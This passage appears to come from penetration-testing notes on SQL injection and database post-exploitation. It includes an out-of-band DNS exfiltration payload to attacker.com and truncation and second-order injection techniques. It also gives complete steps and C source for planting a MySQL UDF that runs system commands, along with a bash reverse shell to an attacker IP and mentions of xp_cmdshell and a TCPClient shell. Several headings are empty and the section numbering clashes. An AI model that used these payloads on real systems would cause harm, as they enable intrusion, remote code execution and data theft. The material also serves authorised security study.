Out-of-band (OOB) DNS or HTTP callback to attacker-controlled server Data exfiltrated via DNS subdomain or HTTP request body; nothing in HTTP response LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\x')) Burp Collaborator, sqlmap --technique=Q
Truncation Registration endpoint with known fixed column length; silent trim on INSERT New DB row created that collides with existing privileged username after truncation admin       x (padded past max length) Manual; requires knowledge of column length
Second-order Payload stored safely, then unsafely retrieved and used in a later query Exploitation fires on a different page/action than where payload was injected Register username admin'--; trigger via profile update or password reset Manual; hard to detect with automated scanners

4.5.1 Tools for Connecting Usage

Use the native mysql client or Impacket's mssqlclient when you already have credentials.

mysql -u <username> -p -h <host>
-- MySQL recon

# MySQL UDF — compile the shared object
sudo apt install mysql-server-dev libmysqlclient-dev
gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c -lc

# Inject the .so into the plugin directory
mysql -u root -p -h <host> -e "USE mysql;
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES (LOAD_FILE('/path/to/lib_mysqludf_sys.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
// lib_mysqludf_sys.c — UDF source for sys_exec()
#include <my_global.h>
#include <my_sys.h>
#include <mysql.h>
#include <stdio.h>
#include <stdlib.h>

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
void sys_exec_deinit(UDF_INIT *initid);
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_exec() requires exactly one string argument");
        return 1;
    }
    return 0;
}

void sys_exec_deinit(UDF_INIT *initid) {}

long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    const char *command = args->args[0];
    return system(command);
}
-- Register and use the UDF
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');
SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
impacket-mssqlclient <username>:<password>@<host> -windows-auth
-- MSSQL recon

SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '<table_name>';
SELECT * FROM <schema>.dbo.sysusers;

-- Enable and use xp_cmdshell (requires sysadmin)

python3 -m http.server 80

-- Direct TCPClient reverse shell

4.5.2 SQL Injection

3.5.2.1–3 Common Functions, Error-Based & UNION-Based Payloads

Function (MySQL)Description
LIMIT <offset>, <rows>Display rows based on offset and count
COUNT(*)Number of rows
RAND()Random number between 0 and 1
